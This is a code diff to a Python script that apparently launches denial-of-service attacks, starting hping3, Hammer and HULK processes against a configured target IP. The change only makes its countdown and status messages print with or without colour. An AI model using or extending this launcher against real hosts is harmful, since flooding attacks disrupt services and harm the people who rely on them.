@@ -10,12 +10,18 @@ config = Config()
 
 if __name__ == "__main__":
     for i in range(config.waitTime):
-        print(
-            f"\n{Bcolors.OKGREEN}{5-i} seconds before attacking {config.ATKIPv4}....{Bcolors.ENDC}"
-        )
+        if config.printColor:
+            print(
+                f"\n{Bcolors.OKGREEN}{5-i} seconds before attacking {config.ATKIPv4}....{Bcolors.ENDC}"
+            )
+        else:
+            print(f"\n{5-i} seconds before attacking {config.ATKIPv4}....")
         time.sleep(1)
 
-    print(f"\n{Bcolors.OKGREEN}Starting DoS attack...{Bcolors.ENDC}")
+    if config.printColor:
+        print(f"\n{Bcolors.OKGREEN}Starting DoS attack...{Bcolors.ENDC}")
+    else:
+        print(f"\nStarting DoS attack...")
     try:
         processes = 0
         if config.HPING3:
@@ -38,10 +44,16 @@ if __name__ == "__main__":
             p_hammer.start()
             processes += 1
         if processes == 0:
-            print(f"{Bcolors.FAIL}[-] No DoS tools selected.{Bcolors.ENDC}")
+            if config.printColor:
+                print(f"{Bcolors.FAIL}[-] No DoS tools selected.{Bcolors.ENDC}")
+            else:
+                print(f"[-] No DoS tools selected.")
             exit(0)
     except KeyboardInterrupt:
-        print(f"{Bcolors.FAIL}[-] Canceled by user{Bcolors.ENDC}")
+        if config.printColor:
+            print(f"{Bcolors.FAIL}[-] Canceled by user{Bcolors.ENDC}")
+        else:
+            print(f"[-] Canceled by user")
         if config.HPING3:
             p_hping3.terminate()
         if config.Hammer:
@@ -49,4 +61,7 @@ if __name__ == "__main__":
         if config.HULK:
             p_hulk.terminate()
 
-    print(f"{Bcolors.OKGREEN}Started DoS attack.{Bcolors.ENDC}")
+    if config.printColor:
+        print(f"{Bcolors.OKGREEN}Started DoS attack.{Bcolors.ENDC}")
+    else:
+        print(f"Started DoS attack.")
